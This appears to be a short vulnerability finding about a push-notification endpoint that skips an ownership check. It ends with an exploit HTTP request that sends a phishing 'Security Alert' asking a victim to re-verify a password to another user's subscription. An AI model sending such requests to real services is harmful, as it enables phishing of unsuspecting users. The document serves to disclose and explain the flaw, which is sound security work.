diagnosis: SendTestPushNotificationView allows authenticated users to test browser push notifications. The view fetches PushInformation.objects.filter(id=sub_id) and sends the supplied payload to the subscription's registered user without verifying that push_info.user == request.user. An attacker can supply arbitrary subscription IDs to broadcast phishing links or spoofed administrative notices directly onto other users' desktops and mobile lock screens.
exploit_request:
POST /api/webpush/test/ HTTP/1.1
Host: push.saashub.com
Authorization: Bearer 44332211...
Content-Type: application/json

{"subscription_id": 841, "payload": {"head": "Security Alert", "body": "Click here to re-verify your password."}}
